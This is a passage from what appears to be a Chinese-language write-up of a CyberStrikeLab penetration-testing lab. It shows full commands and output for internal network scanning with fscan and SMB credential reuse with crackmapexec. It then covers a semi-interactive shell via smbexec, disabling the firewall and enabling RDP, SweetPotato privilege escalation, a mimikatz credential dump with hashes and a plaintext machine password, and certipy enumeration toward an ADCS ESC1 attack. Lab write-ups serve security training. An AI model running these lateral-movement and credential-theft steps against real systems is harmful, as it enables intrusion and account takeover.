class=\"hljs-built_in\"\u003ehead\u003c/span\u003e\u003e\n\u0026#x3C;meta name=\u003cspan class=\"hljs-string\"\u003e\"Generator\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"CmsEasy 7_7_5_20211012_UTF8\"\u003c/span\u003e /\u003e\n    \u0026#x3C;meta charset=\u003cspan class=\"hljs-string\"\u003e\"utf-8\"\u003c/span\u003e /\u003e\n    \u0026#x3C;meta name=\u003cspan class=\"hljs-string\"\u003e\"renderer\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"webkit\"\u003c/span\u003e/\u003e\n    \u0026#x3C;meta name=\u003cspan class=\"hljs-string\"\u003e\"force-rendering\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"webkit\"\u003c/span\u003e/\u003e\n    \u0026#x3C;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"X-UA-Compatible\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"IE=edge,chrome=1\"\u003c/span\u003e\u003e\n    \u0026#x3C;meta name=\u003cspan class=\"hljs-string\"\u003e\"viewport\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui\"\u003c/span\u003e\u003e\n    \u0026#x3C;title\u003e中文网页标题\u0026#x3C;/title\u003e\n    ....\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e内网信息收集\u003c/h2\u003e\n\u003cp\u003e代理搭建完毕后，上传 \u003ccode\u003efscan\u003c/code\u003e 对内网进行扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(node 0) \u003e\u003e upload D:\\fscan.exe C:\\phpstudy_pro\\www\\fscan.exe\n[*] File transmitting, please \u003cspan class=\"hljs-built_in\"\u003ewait\u003c/span\u003e...\n8.33 MiB / 8.33 MiB [-------------------------------------------------------------------\u003e__] 96.69% 2.54 MiB p/s ETA 0s\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003efscan\u003c/code\u003e 扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\phpstudy_pro\\WWW\u003efscan.exe -h 10.6.6.1-10.6.6.255\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-05-22 05:44:45] [INFO] 暴力破解线程数: 1\n[2025-05-22 05:44:45] [INFO] 开始信息扫描\n[2025-05-22 05:44:45] [INFO] 生成IP范围: 10.6.6.1.%!d(string=10.6.6.255) - %!s(MISSING).%!d(MISSING)\n[2025-05-22 05:44:45] [INFO] 最终有效主机数量: 255\n[2025-05-22 05:44:45] [INFO] 开始主机扫描\n[2025-05-22 05:44:45] [SUCCESS] 目标 10.6.6.10       存活 (ICMP)\n[2025-05-22 05:44:46] [SUCCESS] 目标 10.6.6.55       存活 (ICMP)\n[2025-05-22 05:44:46] [SUCCESS] 目标 10.6.6.88       存活 (ICMP)\n[2025-05-22 05:44:48] [INFO] 存活主机数量: 3\n[2025-05-22 05:44:48] [INFO] 有效端口数量: 233\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.55:135\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.10:135\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.55:88\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.55:80\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.10:80\n[2025-05-22 05:44:49] [SUCCESS] 端口开放 10.6.6.88:135\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.88:445\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.55:445\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.10:445\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.55:389\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.88:139\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.55:139\n[2025-05-22 05:44:50] [SUCCESS] 端口开放 10.6.6.10:139\n[2025-05-22 05:44:53] [SUCCESS] 端口开放 10.6.6.10:3306\n[2025-05-22 05:44:54] [SUCCESS] 服务识别 10.6.6.55:88 =\u003e\n[2025-05-22 05:44:54] [SUCCESS] 服务识别 10.6.6.10:80 =\u003e [http]\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.88:445 =\u003e\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.55:445 =\u003e\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.10:445 =\u003e\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.55:389 =\u003e [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: cyberstrikelab.com, Site: Default-First-Site-Name\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.88:139 =\u003e  Banner:[.]\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.55:139 =\u003e  Banner:[.]\n[2025-05-22 05:44:55] [SUCCESS] 服务识别 10.6.6.10:139 =\u003e  Banner:[.]\n[2025-05-22 05:44:57] [SUCCESS] 服务识别 10.6.6.55:80 =\u003e [http]\n[2025-05-22 05:44:57] [SUCCESS] 服务识别 10.6.6.10:3306 =\u003e [mysql] 产品:MySQL 信息:unauthorized Banner:[H.j Host \u003cspan class=\"hljs-string\"\u003e'WIN-784BAKDI0AC'\u003c/span\u003e is not allowed to connect to this MySQL server]\n[2025-05-22 05:45:54] [SUCCESS] 服务识别 10.6.6.55:135 =\u003e\n[2025-05-22 05:45:54] [SUCCESS] 服务识别 10.6.6.10:135 =\u003e\n[2025-05-22 05:45:54] [SUCCESS] 服务识别 10.6.6.88:135 =\u003e\n[2025-05-22 05:45:54] [INFO] 存活端口数量: 14\n[2025-05-22 05:45:54] [INFO] 开始漏洞扫描\n[2025-05-22 05:45:54] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-05-22 05:45:55] [SUCCESS] 网站标题 http://10.6.6.10          状态码:200 长度:77272  标题:中文网页标题\n[2025-05-22 05:45:55] [SUCCESS] NetInfo 扫描结果\n目标主机: 10.6.6.88\n主机名: cyberweb\n发现的网络接口:\n   IPv4地址:\n      └─ 10.6.6.88\n[2025-05-22 05:45:55] [SUCCESS] NetInfo 扫描结果\n目标主机: 10.6.6.10\n主机名: WIN-784BAKDI0AC\n发现的网络接口:\n   IPv4地址:\n      └─ 172.5.33.6\n      └─ 10.6.6.10\n[2025-05-22 05:45:55] [SUCCESS] NetInfo 扫描结果\n目标主机: 10.6.6.55\n主机名: DC\n发现的网络接口:\n   IPv4地址:\n      └─ 10.6.6.55\n[2025-05-22 05:45:55] [SUCCESS] 网站标题 http://10.6.6.55          状态码:200 长度:703    标题:IIS Windows Server\n[2025-05-22 05:45:55] [INFO] 系统信息 10.6.6.55 [Windows Server 2016 Standard 14393]\n[2025-05-22 05:45:55] [INFO] 系统信息 10.6.6.88 [Windows Server 2016 Standard 14393]\n[2025-05-22 05:45:56] [SUCCESS] NetBios 10.6.6.88       cyberweb.cyberstrikelab.com         Windows Server 2016 Standard 14393\n[2025-05-22 05:45:56] [SUCCESS] 目标: http://10.6.6.55:80\n  漏洞类型: poc-yaml-active-directory-certsrv-detect\n  漏洞名称:\n  详细信息:\n        author:AgeloVito\n        links:https://www.cnblogs.com/EasonJim/p/6859345.html\n[2025-05-22 05:46:53] [INFO] SMB2共享信息 10.6.6.88:445 admin Pass:123456 共享:[ADMIN$ C$ IPC$ smb]\n[2025-05-22 05:47:10] [SUCCESS] SMB认证成功 10.6.6.88:445 administrator:qwe123!@#\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e从上面的信息中能得到：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e域：\u003ccode\u003ecyberstrikelab.com\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eDC：\u003ccode\u003e10.6.6.55\u003c/code\u003e \u003ccode\u003eDC.cyberstrikelab.com\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecyberweb.cyberstrikelab.com\u003c/code\u003e 管理员账户 \u003ccode\u003eadministrator:qwe123!@#\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003ecyberweb - 10.6.6.88\u003c/h2\u003e\n\u003cp\u003e上面拿到了凭据，信息收集一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Lab-9 proxychains -q crackmapexec smb 10.6.6.88 -u administrator -p \u003cspan class=\"hljs-string\"\u003e'qwe123!@#'\u003c/span\u003e\nSMB         10.6.6.88       445    CYBERWEB         [*] Windows Server 2016 Standard 14393 x64 (name:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True)\nSMB         10.6.6.88       445    CYBERWEB         [-] cyberstrikelab.com\\administrator:qwe123!@# STATUS_LOGON_FAILURE \n\n➜  Lab-9 proxychains -q crackmapexec smb 10.6.6.88 -u administrator -p \u003cspan class=\"hljs-string\"\u003e'qwe123!@#'\u003c/span\u003e --local-auth\nSMB         10.6.6.88       445    CYBERWEB         [*] Windows Server 2016 Standard 14393 x64 (name:CYBERWEB) (domain:CYBERWEB) (signing:False) (SMBv1:True)\nSMB         10.6.6.88       445    CYBERWEB         [+] CYBERWEB\\administrator:qwe123!@# (Pwn3d!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e只能进行本地验证，没有域用户，需要进行提权到\u003ccode\u003eSYSTEM\u003c/code\u003e ，然后通过 \u003ccode\u003eSYSTEM\u003c/code\u003e 抓取机器用户或者域用户来进行\u003ccode\u003eESC\u003c/code\u003e攻击\u003c/p\u003e\n\u003cp\u003e因为靶机介绍中，提到某证书服务漏洞，那么肯定就是\u003ccode\u003eADCS\u003c/code\u003e了，但是\u003ccode\u003eESC\u003c/code\u003e几还不知道，\u003ccode\u003eCA\u003c/code\u003e也还不知道\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003esmbexec\u003c/code\u003e 获得 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Lab-9 proxychains -q smbexec.py administrator:\u003cspan class=\"hljs-string\"\u003e'qwe123!@#'\u003c/span\u003e@10.6.6.88 -codec gbk\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\Windows\\system32\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eflag 2\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ego-flag{0A433C09-0529-4205-848D-6DADCE311646}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ewhoami\u003c/code\u003e 信息中能看到 \u003ccode\u003eSeImpersonatePrivilege\u003c/code\u003e 权限，可以使用 \u003ccode\u003eSweetPotato\u003c/code\u003e 进行提权，拥有该权限可以将 \u003ccode\u003eAdministration\u003c/code\u003e 用户提权到 \u003ccode\u003eSYSTEM\u003c/code\u003e 。关于土豆家族提权原理：\u003ca href=\"https://xz.aliyun.com/news/7371\"\u003ehttps://xz.aliyun.com/news/7371\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e开启 \u003ccode\u003eRDP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Windows\\system32\u003eREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003eServer /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n操作成功完成。\nC:\\Windows\\system32\u003enetsh advfirewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e allprofiles state off\n确定。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行远程桌面连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传 \u003ccode\u003eSweetPotato\u003c/code\u003e 和 \u003ccode\u003emimikatz\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003eSweetPotato\u003c/code\u003e 进行提权，获得\u003ccode\u003eSYSTEM\u003c/code\u003e 权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eDC - 10.6.6.55\u003c/h2\u003e\n\u003cp\u003e提权后使用 \u003ccode\u003emimikatz\u003c/code\u003e 抓取机器账户 \u003ccode\u003ehash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\mimikatz-master\\x64\u003e\n\n  .#####.   mimikatz 2.2.0 (x64) \u003cspan class=\"hljs-comment\"\u003e#18362 Feb 29 2020 11:13:36\u003c/span\u003e\n .## ^ \u003cspan class=\"hljs-comment\"\u003e##.  \"A La Vie, A L'Amour\" - (oe.eo)\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e## \\ / ##       \u003e http://blog.gentilkiwi.com/mimikatz\u003c/span\u003e\n \u003cspan class=\"hljs-string\"\u003e'## v ##'\u003c/span\u003e       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  \u003cspan class=\"hljs-string\"\u003e'#####'\u003c/span\u003e        \u003e http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz \u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\nUsing \u003cspan class=\"hljs-string\"\u003e'mimikatz.log'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e logfile : OK\n\nmimikatz \u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\nPrivilege \u003cspan class=\"hljs-string\"\u003e'20'\u003c/span\u003e OK\n\nmimikatz \u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\nAuthentication Id : 0 ; 1769582 (00000000:001b006e)\nSession           : Interactive from 3\nUser Name         : DWM-3\nDomain            : Window Manager\nLogon Server      : (null)\n\nLogon Time        : 2025/5/22 14:14:10\nSID               : S-1-5-90-0-3\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n\n        wdigest :\n\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password :\n(null)\n        kerberos :\n\n         * Username : CYBERWEB$\n         * Domain   : cyberstrikelab.com\n         * Password :\nI@w2(l8:\u003cspan class=\"hljs-variable\"\u003e$e9\u003c/span\u003e`bRA7\u0026#x26;\u003cspan class=\"hljs-variable\"\u003e$Rxd\u003c/span\u003e^f@6+_,hg\\L)\u0026#x26;Ck6he8vlsS7*=[e*%bh-wZ.,\u003cspan class=\"hljs-variable\"\u003e$HV\u003c/span\u003e(0^!/q0eY=sDH_1)6jK3v;#%kt[5YSXt3\u003cspan class=\"hljs-variable\"\u003e$y\u003c/span\u003e/;R(wAqp1p_`\u003cspan class=\"hljs-string\"\u003e\"m=o:Q;HtsY\n        ssp :\n\n        credman :\n\nAuthentication Id : 0 ; 51166 (00000000:0000c7de)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:29\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : CYBERWEB$\n         * Domain   : cyberstrikelab.com\n         * Password : I@w2(l8:\u003cspan class=\"hljs-variable\"\u003e$e9\u003c/span\u003e`bRA7\u0026#x26;\u003cspan class=\"hljs-variable\"\u003e$Rxd\u003c/span\u003e^f@6+_,hg\\L)\u0026#x26;Ck6he8vlsS7*=[e*%bh-wZ.,\u003cspan class=\"hljs-variable\"\u003e$HV\u003c/span\u003e(0^!/q0eY=sDH_1)6jK3v;#%kt[5YSXt3\u003cspan class=\"hljs-variable\"\u003e$y\u003c/span\u003e/;R(wAqp1p_`\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"m=o:Q;HtsY\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : CYBERWEB$\nDomain            : CYBERSTRIKELAB\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:23\nSID               : S-1-5-20\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : cyberweb$\n         * Domain   : CYBERSTRIKELAB.COM\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 23223 (00000000:00005ab7)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:18\nSID               :\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n        kerberos :\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 1769613 (00000000:001b008d)\nSession           : Interactive from 3\nUser Name         : DWM-3\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/5/22 14:14:10\nSID               : S-1-5-90-0-3\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : CYBERWEB$\n         * Domain   : cyberstrikelab.com\n         * Password : I@w2(l8:\u003cspan class=\"hljs-variable\"\u003e$e9\u003c/span\u003e`bRA7\u0026#x26;\u003cspan class=\"hljs-variable\"\u003e$Rxd\u003c/span\u003e^f@6+_,hg\\L)\u0026#x26;Ck6he8vlsS7*=[e*%bh-wZ.,\u003cspan class=\"hljs-variable\"\u003e$HV\u003c/span\u003e(0^!/q0eY=sDH_1)6jK3v;#%kt[5YSXt3\u003cspan class=\"hljs-variable\"\u003e$y\u003c/span\u003e/;R(wAqp1p_`\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"m=o:Q;HtsY\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 315377 (00000000:0004cff1)\nSession           : Interactive from 0\nUser Name         : cslab\nDomain            : CYBERSTRIKELAB\nLogon Server      : DC\nLogon Time        : 2025/5/22 13:16:25\nSID               : S-1-5-21-4286488488-1212600890-1604239976-1104\n        msv :\n         [00000003] Primary\n         * Username : cslab\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 39b0e84f13872f51efb3b8ba5018c517\n         * SHA1     : fa6a465532224cc4f1fa5094424bf219d25b7463\n\n         * DPAPI    :\n432dfb0f990f2cc292b2fd09468aab5e\n        tspkg :\n        wdigest :\n         * Username : cslab\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : cslab\n         * Domain   : CYBERSTRIKELAB.COM\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 135581 (00000000:0002119d)\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : CYBERWEB\nLogon Server      : CYBERWEB\nLogon Time        : 2025/5/22 5:14:06\nSID               : S-1-5-21-332097019-2215467117-1557799732-500\n        msv :\n         [00000003] Primary\n         * Username : Administrator\n         * Domain   : CYBERWEB\n         * NTLM     : c377ba8a4dd52401bc404dbe49771bbc\n         * SHA1     : d9ac14100bf4e36f6807dd3c29051983b2d58d3d\n        tspkg :\n        wdigest :\n         * Username : Administrator\n         * Domain   : CYBERWEB\n         * Password : (null)\n        kerberos :\n         * Username : Administrator\n         * Domain   : CYBERWEB\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:29\nSID               : S-1-5-19\n        msv :\n        tspkg :\n        wdigest :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        kerberos :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 51191 (00000000:0000c7f7)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:29\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : CYBERWEB$\n         * Domain   : cyberstrikelab.com\n         * Password : I@w2(l8:\u003cspan class=\"hljs-variable\"\u003e$e9\u003c/span\u003e`bRA7\u0026#x26;\u003cspan class=\"hljs-variable\"\u003e$Rxd\u003c/span\u003e^f@6+_,hg\\L)\u0026#x26;Ck6he8vlsS7*=[e*%bh-wZ.,\u003cspan class=\"hljs-variable\"\u003e$HV\u003c/span\u003e(0^!/q0eY=sDH_1)6jK3v;#%kt[5YSXt3\u003cspan class=\"hljs-variable\"\u003e$y\u003c/span\u003e/;R(wAqp1p_`\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"m=o:Q;HtsY\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : CYBERWEB$\nDomain            : CYBERSTRIKELAB\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:17\nSID               : S-1-5-18\n        msv :\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : cyberweb$\n         * Domain   : CYBERSTRIKELAB.COM\n         * Password : (null)\n        ssp :\n        credman :\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到机器用户凭据 \u003ccode\u003eCYBERWEB$\u003c/code\u003e ，NTLM： \u003ccode\u003e331dcbb88d1a4847c97eab7c1c168ac8\u003c/code\u003e ，Password： \u003ccode\u003eI@w2\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e10.6.6.55       DC.cyberstrikelab.com   cyberstrikelab.com\n10.6.6.77       cyberweb.cyberstrikelab.com \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e回到\u003ccode\u003eKali\u003c/code\u003e，使用 \u003ccode\u003ecertipy-ad\u003c/code\u003e 和 \u003ccode\u003eBloodhound-py\u003c/code\u003e(略) 通过机器用户 \u003ccode\u003eCYBERWEB$\u003c/code\u003e 收集域内信息分析 \u003ccode\u003eADCS\u003c/code\u003e 攻击\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Lab-9 proxychains -q certipy-ad find -u CYBERWEB$ -hashes 331dcbb88d1a4847c97eab7c1c168ac8 -dns-tcp -dc-ip 10.6.6.55 -bloodhound -debug   \nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Authenticating to LDAP server\n[+] Bound to ldaps://10.6.6.55:636 - ssl\n[+] Default path: DC=cyberstrikelab,DC=com\n[+] Configuration path: CN=Configuration,DC=cyberstrikelab,DC=com\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[+] Trying to resolve \u003cspan class=\"hljs-string\"\u003e'DC.cyberstrikelab.com'\u003c/span\u003e at \u003cspan class=\"hljs-string\"\u003e'10.6.6.55'\u003c/span\u003e\n[*] Trying to get CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'cyberstrikelab-DC-CA'\u003c/span\u003e via CSRA\n[+] Trying to get DCOM connection \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e: 10.6.6.55\n[!] Got error \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e trying to get CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'cyberstrikelab-DC-CA'\u003c/span\u003e via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'cyberstrikelab-DC-CA'\u003c/span\u003e via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[+] Connected to remote registry at \u003cspan class=\"hljs-string\"\u003e'DC.cyberstrikelab.com'\u003c/span\u003e (10.6.6.55)\n[*] Got CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'cyberstrikelab-DC-CA'\u003c/span\u003e\n[+] Resolved \u003cspan class=\"hljs-string\"\u003e'DC.cyberstrikelab.com'\u003c/span\u003e from cache: 10.6.6.55\n[+] Connecting to 10.6.6.55:80\n[*] Saved BloodHound data to \u003cspan class=\"hljs-string\"\u003e'20250522025230_Certipy.zip'\u003c/span\u003e. Drag and drop the file into the BloodHound GUI from @ly4k\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e导入到\u003ccode\u003eBloodHound\u003c/code\u003e 进行分析，这里使用的\u003ccode\u003eBloodHound\u003c/code\u003e版本是：\u003ca href=\"https://github.com/ly4k/BloodHound/releases/tag/v4.2.0-ly4k\"\u003ehttps://github.com/ly4k/BloodHound/releases/tag/v4.2.0-ly4k\u003c/a\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eCA\u003c/code\u003e 名称\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e10.6.6.55       DC.cyberstrikelab.com   cyberstrikelab.com   CYBERSTRIKELAB-DC-CA\n10.6.6.77       cyberweb.cyberstrikelab.com \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找攻击路径，可以在 \u003cstrong\u003e查找配置错误的证书模板\u003c/strong\u003e 中找到\u003ccode\u003eDC\u003c/code\u003e的证书模板\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Cyberstrikelablab9/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eESC 1\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eDC\u003c/code\u003e证书模板的属性（喂给\u003ccode\u003eAI\u003c/code\u003e）：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eAny Purpose\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eAuthorized Signatures Required\u003c/td\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCertificate 